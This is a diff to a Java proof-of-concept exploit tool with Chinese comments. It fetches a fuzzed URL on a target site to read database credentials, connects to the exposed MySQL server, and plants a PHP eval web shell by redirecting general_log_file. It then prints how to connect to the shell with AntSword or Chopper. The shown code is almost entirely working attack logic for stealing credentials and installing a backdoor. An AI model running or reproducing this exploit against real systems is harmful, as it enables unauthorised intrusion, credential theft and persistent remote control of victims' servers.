@@ -79,7 +79,7 @@ public class Poc {
         String urlFuzz_1 = this.url + payload_1;
 
         // 发送请求并获取响应
-       Response response = null;
+       Response response;
         try {
             response = OkHttpUtils.sendRequest(urlFuzz_1);
         }catch (Exception e)
@@ -89,7 +89,6 @@ public class Poc {
         }
         if (response.code() != 200){
             System.out.println("\033[31;1m[-]无法连接:" + urlFuzz_1 + "\033[0m");
-            return;
         }
         else {
             String respText = response.body().string();
@@ -102,7 +101,7 @@ public class Poc {
             // 迭代查找匹配的字段和值
             while (matcher.find()) {
                 String key = matcher.group(1);  // 字段名 (hostname, username, etc.)
-                String value = matcher.group(2);  // 字段值 (localhost, admin, etc.)
+                String value = matcher.group(2);  // 字段值 (localhost, root, etc.)
                 sqlMap.put(key,value);
             }
             System.out.println("\033[33;1m[+]" +
@@ -112,15 +111,17 @@ public class Poc {
                                ",Username:" + sqlMap.get("username") +
                                ",Password:" + sqlMap.get("password") + "\033[0m");
             if (sqlMap.get("database") == null || sqlMap.get("username") == null ){
+                System.out.println("\033[31;1m[-]" + "目标不存在文件读取漏洞!" + "\033[0m");
                 return;
             }
             Connection connection = MySQLUtils.TestConnect(this.ip,sqlMap.get("hostport"),sqlMap.get("database"),sqlMap.get("username"),sqlMap.get("password"));
             if (connection != null)
             {
+                // 非批量验证时,尝试GetShell
                 if (!ArgsUtils.ifRead){
                     // 创建 Statement 对象
                     Statement statement = connection.createStatement();
-                    String version="";
+                    String version;
                     String basedir="";
                     String ShellCmd = getRandomString();
                     // 执行 SQL 查询：获取 MySQL 版本
@@ -142,13 +143,12 @@ public class Poc {
                     statement.execute(sql);
                     sql = "set global general_log_file = '" +  ShellPath + "';";
                     statement.execute(sql);
-
                     sql = "select '<?php echo eval($_POST[\"" + ShellCmd +"\"]);?>';";
                     statement.execute(sql);
                     sql = "set global general_log = off;";
                     statement.execute(sql);
                     System.out.println("\033[32;1m[+]" + "目标网站Shell已经写入\033[0m");
-                    System.out.println("\033[32;1m[+]" + "访问" + this.url + "api.php/?" + ShellCmd + "\033[0m");
+                    System.out.println("\033[32;1m[+]" + "使用蚁剑/菜刀连接:" + this.url + "api.php\tpassword:" + ShellCmd + "\033[0m");
                     // 关闭连接
                 }else {
                     System.out.println("\033[34;1m[+]" + "目标数据库可远程连接!\033[0m");
@@ -156,7 +156,7 @@ public class Poc {
                 connection.close();
             }
             else {
-                System.out.println("\033[31;1m[-]" + "目标数据库不支持远程连接!" + "\033[0m");
+                System.out.println("\033[31;1m[-]" + "目标数据库拒绝远程连接!" + "\033[0m");
             }
         }
     }
